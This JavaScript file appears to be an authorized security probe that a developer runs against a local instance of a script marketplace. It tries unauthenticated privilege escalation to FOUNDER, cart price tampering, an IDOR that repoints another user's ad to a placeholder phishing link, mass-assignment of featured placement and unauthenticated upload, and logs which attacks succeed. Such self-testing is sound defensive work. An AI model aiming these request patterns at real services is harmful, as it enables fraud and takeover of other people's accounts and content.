// Authorized security probe against the LOCAL instance — tries to break auth,
// authorization, payment integrity and mass-assignment. Read-ish: it mutates the
// local PGlite test DB only. Dev server must be running on :3000.
//   node scripts/security-probe.mjs
const BASE = process.env.BASE || "http://localhost:3000"

const findings = []
const rec = (sev, name, broken, detail = "") => {
  findings.push({ sev, name, broken, detail })
  const tag = broken ? `🔴 VULNERABLE` : `🟢 defended`
  console.log(`  ${tag} [${sev}] ${name}${detail ? ` — ${detail}` : ""}`)
}

function makeJar() {
  const jar = new Map()
  return {
    header: () => [...jar.entries()].map(([k, v]) => `${k}=${v}`).join("; "),
    absorb: (res) => { for (const c of (res.headers.getSetCookie?.() || [])) { const [p] = c.split(";"); const i = p.indexOf("="); const k = p.slice(0, i).trim(), v = p.slice(i + 1).trim(); if (!v || v === "deleted") jar.delete(k); else jar.set(k, v) } },
  }
}
async function jf(jar, path, opts = {}) {
  const res = await fetch(BASE + path, { ...opts, redirect: "manual", headers: { ...(opts.headers || {}), cookie: jar?.header() || "" } })
  if (jar) jar.absorb(res)
  return res
}
async function login(jar, key) {
  const { csrfToken } = await (await jf(jar, "/api/auth/csrf")).json()
  await jf(jar, "/api/auth/callback/dev-credentials", { method: "POST", headers: { "content-type": "application/x-www-form-urlencoded" }, body: new URLSearchParams({ csrfToken, key, json: "true", callbackUrl: BASE }).toString() })
  return (await (await jf(jar, "/api/auth/session")).json())
}
const J = (o) => ({ method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(o) })

async function main() {
  console.log(`\n▶ Security probe @ ${BASE}\n`)
  const admin = makeJar(); await login(admin, "admin")
  const buyer = makeJar(); const buyerSess = await login(buyer, "buyer")
  const buyerId = buyerSess?.user?.id

  // ── A. Unauthenticated privilege escalation via /api/admin/set-founder ────
  console.log("A) /api/admin/set-founder (unauthenticated)")
  const sf = await jf(null, "/api/admin/set-founder", J({ userId: "dev-buyer" }))
  const sfBody = await sf.json().catch(() => ({}))
  rec("CRITICAL", "Anyone can promote any user to FOUNDER with no auth", sf.status === 200 && !!sfBody?.success, `status=${sf.status} roles=${JSON.stringify(sfBody?.user?.roles)}`)

  // ── B. Price tampering on a platform paid slot (cart/add custom package) ──
  console.log("B) /api/cart/add price tampering (buyer)")
  await jf(buyer, "/api/cart/add", J({ itemType: "subscription", itemId: "featured-scripts:executive:8", title: "Featured Script Slots - Executive (8 weeks)", price: 0.01, metadata: { packageType: "featured-scripts", couponScope: "Featured Script Slots", packageId: "executive", durationWeeks: 8, slotsToAdd: 99 } }))
  const cart = await (await jf(buyer, "/api/cart")).json().catch(() => ({}))
  const tamper = (cart.items || []).find((i) => String(i.itemId).startsWith("featured-scripts:executive"))
  rec("HIGH", "Client sets the price for the platform's own paid slots", !!tamper && Number(tamper.price) <= 1, `accepted price=${tamper?.price} slotsToAdd=${tamper?.metadata?.slotsToAdd}`)

  // ── C. IDOR: edit another owner's public ad (/api/ads/[id] PATCH) ─────────
  console.log("C) /api/ads/6001 PATCH as buyer (IDOR)")
  const evil = "https://evil.example/phish"
  const patch = await jf(buyer, "/api/ads/6001", { method: "PATCH", headers: { "content-type": "application/json" }, body: JSON.stringify({ title: "PWNED", description: "x", image_url: "x", link_url: evil, category: "Scripts", status: "active" }) })
  const patched = await patch.json().catch(() => ({}))
  const newLink = patched?.ad?.link_url || patched?.link_url || patched?.updatedAd?.link_url
  rec("HIGH", "Any logged-in user can rewrite ANY public ad (link → phishing)", patch.status === 200, `status=${patch.status} link=${newLink || "?"}`)

  // ── D. Mass-assignment: self-grant featured placement (free promotion) ────
  console.log("D) /api/scripts POST featured:true (buyer self-promote)")
  const FT = `SEC Featured ${Date.now().toString().slice(-6)}`
  const cre = await jf(buyer, "/api/scripts", J({ title: FT, description: "mass-assign test", price: 9.99, category: "scripts", framework: ["esx"], featured: true }))
  let featuredStuck = false
  if (cre.status === 200 || cre.status === 201) {
    const pend = await (await jf(admin, "/api/admin/scripts?status=pending&limit=80")).json().catch(() => ({}))
    const mine = (pend.scripts || pend || []).find?.((s) => s.title === FT)
    featuredStuck = !!mine?.featured
  }
  rec("MEDIUM", "Seller can self-set featured:true (free paid-slot promotion)", featuredStuck, `created=${cre.status} featured=${featuredStuck}`)

  // ── E. Unauthenticated file upload (/api/upload) ─────────────────────────
  console.log("E) /api/upload (no session)")
  const fd = new FormData()
  fd.append("file", new Blob([new Uint8Array([0xff, 0xd8, 0xff])], { type: "image/jpeg" }), "x.jpg")
  fd.append("type", "image"); fd.append("purpose", "screenshot")
  const up = await jf(null, "/api/upload", { method: "POST", body: fd })
  rec("MEDIUM", "Upload endpoint requires no authentication", up.status !== 401 && up.status !== 403, `status=${up.status} (passes auth gate; only fails later at storage)`)

  // ── F. The dev-login backdoor (intentionally ON in local dev) ────────────
  console.log("F) /api/auth/callback/dev-credentials (dev backdoor)")
  const back = makeJar(); const bsess = await login(back, "admin")
  const devLoginOn = !!bsess?.user?.roles?.includes("admin")
  // Only a *prod* risk: hard-gated to NODE_ENV!==production + boot-throw in auth.ts.
  rec("INFO", "dev-login enabled (expected in local dev; gated OFF in production)", false, devLoginOn ? "on locally — prod-gated" : "off")

  // ── Negative controls — defenses that SHOULD hold (broken=exploit worked) ─
  console.log("Controls (should stay defended):")
  rec("control", "Buyer blocked from admin API", (await jf(buyer, "/api/admin/scripts?status=pending")).status === 200, "")
  rec("control", "Guest blocked from cart", (await jf(null, "/api/cart")).status === 200, "")
  rec("control", "Moderator cannot self-assign founder", await (async () => {
    const mod = makeJar(); await login(mod, "moderator")
    const r = await jf(mod, "/api/admin/users/dev-mod/roles", { method: "PATCH", headers: { "content-type": "application/json" }, body: JSON.stringify({ roles: ["founder"] }) })
    const b = await r.json().catch(() => ({}))
    return (b?.user?.roles || []).includes("founder")
  })(), "")

  const vulns = findings.filter((f) => f.sev !== "control" && f.broken)
  console.log(`\n──────── ${vulns.length} vulnerabilities confirmed ────────`)
  for (const v of vulns) console.log(`  🔴 [${v.sev}] ${v.name}`)
  console.log("")
}
main().catch((e) => { console.error("probe crashed:", e); process.exit(2) })
